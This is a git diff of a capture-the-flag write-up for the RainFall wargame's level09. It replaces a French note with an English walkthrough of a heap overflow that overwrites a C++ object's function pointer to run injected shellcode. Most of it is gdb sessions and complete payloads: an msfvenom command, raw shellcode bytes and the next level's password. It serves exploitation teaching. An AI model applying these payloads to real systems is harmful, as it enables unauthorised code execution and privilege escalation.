@@ -1,23 +1,93 @@
-Pour ce challengeje n ai pas eu besoin de connaitre le c++, j'y suis aller stepbystep avec gdb
+# level09
 
-*main+136 on recupere argv[1]+108 dans le valeur de eax et avec 0x0804a078 pour adresse.
+We can see that the program takes nothing even if a parameters is given. But with a large string, we can make it segfault:
 
-*main+140: La valeur de argv[1]+108 sur 4 octets deviens l adresse de eax, on va donc lui mette l'adresse actuelle + 4 octets (0x0804a07c)
+```bash
+level9@RainFall:~$ ./level9 
+level9@RainFall:~$ ./level9 ds
+level9@RainFall:~$ ./level9 dsasd
+level9@RainFall:~$ ./level9 dsasd ds
+level9@RainFall:~$ ./level9 $(python -c "print 'A' * 200")
+Segmentation fault (core dumped)
+```
 
-*main+144: La valeur de la nouvelle adresse de eax devient l'adresse de edx, on va lui mettre l adresse de notre shellcode.
+Basically the program create two object, each containing a function pointer and a buffer, and copy the first parameter of the program in the buffer of the first object. At the end, it call a the function of the function pointer from the 2nd object.
 
-*main+159: L'adresse de edx est call, qui contient notre shellcode
+We need first to calculate the length to overwrite the function address that will be called at the end:
 
-Shellcode:
+```bash
+(gdb) r AAAA
+Starting program: /home/user/level9/level9 AAAA
 
-Nous avons 108 octets pour placer notre shellcode avant argv[1]+108 afin de generer un shellcode de 64 bytes, j ai utiliser msfvenom comme ceci:
+Breakpoint 2, 0x0804867c in main ()
+(gdb) x/wx $esp+0x14
+0xbffff4c4:     0x0804a008
+(gdb) x/wx $esp+0x18
+0xbffff4c8:     0x0804a078
+(gdb) p/d 0x0804a078 - 0x0804a008
+$3 = 112
+(gdb) x/30wx 0x0804a008
+0x804a008:      0x08048848      0x41414141      0x00000000      0x00000000
+0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a028:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a038:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a048:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a058:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a068:      0x00000000      0x00000000      0x00000005      0x00000071
+0x804a078:      0x08048848      0x00000000
+```
 
-msfvenom -p 'linux/x86/exec' CMD='sh' -a 'x86' --platform 'linux' -f 'c' -b '\x00\x09\x0a\x20'
+We can see that there is 112 bytes between the two objects, but our buffer begin after the four first bytes. We need 108 before overriding the 2nd object:
 
-afin de trouver l adresse de mon exploit, j ai pris l adresse de argv[1]+108 et je lui ais soustrais 64 (longueur du shellcode qui le precede) comme ceci:
+```bash
+(gdb) r $(python -c "print 'A' * 108 + 'BBBB'")
+Starting program: /home/user/level9/level9 $(python -c "print 'A' * 108 + 'BBBB'")
 
-(gdb) p/x 0x804a078-64
+Breakpoint 2, 0x0804867c in main ()
+(gdb) x/30wx 0x0804a008
+0x804a008:      0x08048848      0x41414141      0x41414141      0x41414141
+0x804a018:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804a028:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804a038:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804a048:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804a058:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804a068:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804a078:      0x42424242      0x00000000
+```
 
-On obtient donc un shell avec la commande suivante:
+If we put directly the beginning of our shellcode address (0x804a00c), the program will interpet the value as another address function instead of interpreting the bytes.
 
-./level9 $(python -c "print 'B' * (108-64) + '\x2b\xc9\x83\xe9\xf6\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xf3\x43\x6c\x98\x83\xee\xfc\xe2\xf4\x99\x48\x34\x01\xa1\x25\x04\xb5\x90\xca\x8b\xf0\xdc\x30\x04\x98\x9b\x6c\x0e\xf1\x9d\xca\x8f\xca\x1b\x40\x6c\x98\xf3\x30\x04\x98\xa4\x10\xe5\x79\x3e\xc3\x6c\x98' + '\x7c\xa0\x04\x08' + '\x38\xa0\x04\x08'")
+We will so puts the address of the shellcode four bytes after, and reference this address at the 108 bytes.
+
+The address to put the shellcode address is : 0x804a078 + 4 = 0x0804a07c
+The address to put the shellcode is : 0x804a008 + 4 = 0x804a00c
+
+We try in gdb:
+
+```bash
+(gdb) r $(python -c "print '\x90' * (108-28) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x7c\xa0\x04\x08' + '\x0c\xa0\x04\x08'")
+
+Starting program: /home/user/level9/level9 $(python -c "print '\x90' * (108-28) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x7c\xa0\x04\x08' + '\x0c\xa0\x04\x08'")
+
+Breakpoint 2, 0x0804867c in main ()
+(gdb) x/30wx 0x0804a008
+0x804a008:      0x08048848      0x90909090      0x90909090      0x90909090
+0x804a018:      0x90909090      0x90909090      0x90909090      0x90909090
+0x804a028:      0x90909090      0x90909090      0x90909090      0x90909090
+0x804a038:      0x90909090      0x90909090      0x90909090      0x90909090
+0x804a048:      0x90909090      0x90909090      0x90909090      0x90909090
+0x804a058:      0x90909090      0x6850c031      0x68732f2f      0x69622f68
+0x804a068:      0x89e3896e      0xb0c289c1      0x3180cd0b      0x80cd40c0
+0x804a078:      0x0804a07c      0x0804a00c
+```
+
+We try to exploit:
+
+```bash
+level9@RainFall:~$ ./level9 $(python -c "print '\x90' * (108-28) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x7c\xa0\x04\x08' + '\x0c\xa0\x04\x08'")
+$ whoami
+bonus0
+$ cd /home/user/bonus0
+$ cat .pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
